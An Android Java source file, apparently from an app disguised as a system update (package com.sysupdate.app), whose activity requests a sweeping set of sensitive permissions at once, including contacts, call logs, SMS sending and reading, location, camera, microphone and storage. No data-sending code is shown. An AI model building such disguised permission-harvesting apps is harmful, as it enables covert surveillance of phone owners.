package com.sysupdate.app;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class PermissionActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.READ_CONTACTS);
        perms.add(Manifest.permission.WRITE_CONTACTS);
        perms.add(Manifest.permission.READ_CALL_LOG);
        perms.add(Manifest.permission.WRITE_CALL_LOG);
        perms.add(Manifest.permission.READ_PHONE_STATE);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.SEND_SMS);
        perms.add(Manifest.permission.RECEIVE_SMS);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        if (Build.VERSION.SDK_INT >= 33) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
        }

        List<String> missing = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                missing.add(p);
            }
        }
        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), 1001);
        }
        finish();
    }
}
